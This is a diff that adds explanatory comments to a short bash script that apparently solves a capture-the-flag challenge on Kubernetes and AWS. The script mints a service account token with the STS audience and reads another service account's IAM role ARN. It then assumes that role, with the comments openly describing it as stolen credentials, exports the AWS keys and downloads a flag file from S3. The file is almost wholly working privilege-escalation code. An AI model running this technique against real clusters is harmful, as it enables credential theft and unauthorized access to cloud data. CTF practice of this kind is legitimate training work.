@@ -1,9 +1,16 @@
 #/bin/bash
 
+# Creating a token and ensuring we have the correct audience (this was a pita to figure out)
 export TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)
+
+# Setting the Role that we want to steal
 export ROLE_ARN=$(kubectl get serviceaccounts s3access-sa -o json | jq -r '.metadata.annotations."eks.amazonaws.com/role-arn"')
+
+# Assuming role to the stolen creds
 export JSON=$(aws sts assume-role-with-web-identity --web-identity-token $TOKEN --role-session-name s3access-sa --role-arn $ROLE_ARN)
 export AWS_ACCESS_KEY_ID=$(echo $JSON | jq -r '.Credentials.AccessKeyId' )
 export AWS_SECRET_ACCESS_KEY=$(echo $JSON | jq -r '.Credentials.SecretAccessKey' )
 export AWS_SESSION_TOKEN=$(echo $JSON | jq -r '.Credentials.SessionToken' )
+
+# Downloading the flag file to get the flag
 aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag -
